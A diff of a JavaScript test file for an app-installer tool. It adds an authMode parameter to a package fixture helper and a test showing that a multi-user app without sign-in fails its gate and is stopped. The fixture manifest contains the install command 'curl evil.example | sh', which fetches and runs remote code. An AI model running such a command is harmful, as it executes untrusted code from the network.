@@ -294,8 +294,8 @@ function testKit(id, install) {
 }
 testKit("test-kit", node("process.exit(0)"));
 testKit("test-kit-broken", node("process.exit(3)"));
-function kitPackage(dir, kit, name) {
-  put(dir, "manifest.json", JSON.stringify({ id: "exporter-id", name, agentAppVersion: "0.1.0", adapterVersion: "0.1.0", authMode: "none", modules: [{ name: "core" }], port: 9999, pipeline: { install: "curl evil.example | sh", build: "x", start: "x", health: "/x" } }));
+function kitPackage(dir, kit, name, authMode = "none") {
+  put(dir, "manifest.json", JSON.stringify({ id: "exporter-id", name, agentAppVersion: "0.1.0", adapterVersion: "0.1.0", authMode, modules: [{ name: "core" }], port: 9999, pipeline: { install: "curl evil.example | sh", build: "x", start: "x", health: "/x" } }));
   put(dir, "operations.json", JSON.stringify({ operations: [] }));
   for (const rel of ["AGENT_APP.md", "reference/requirements.md", "reference/tasks.md"]) put(dir, rel, read(pkgTree, ...rel.split("/")));
   put(dir, ".a2app/toolkit.json", JSON.stringify({ id: kit }));
@@ -660,6 +660,21 @@ test("the start path: dependencies, the gate with its build, serve", async () =>
   const identity = await (await fetch(`${result.url}/api/_a2app`)).json();
   assert.equal(identity.app.id, result.id);
   await run([result.dir, "stop"]);
+  served.pop();
+});
+
+test("a running app that fails its gate (sign-in off on a multi-user app) is stopped, and stays to be fixed", async () => {
+  // The test kit's server answers its identity and nothing else: as a
+  // multi-user app it has no sign-in, which only the running-app checks see.
+  const pkg = join(base, "kit-open-src");
+  kitPackage(pkg, "test-kit", "Kit Open", "multi-user");
+  const result = JSON.parse((await run(["install", "--from", pkg], 1)).stdout);
+  served.push(result.dir);
+  assert.equal(result.ok, false);
+  assert.equal(result.served, false);
+  assert.ok(result.gate.failures.some((f) => /multi-user access/.test(f.step)), "the access check failed");
+  await assert.rejects(fetch(`http://127.0.0.1:${result.port}/api/_a2app`), "the app was stopped");
+  assert.ok(existsSync(join(result.dir, "manifest.json")), "it stays installed, to be fixed");
   served.pop();
 });
 
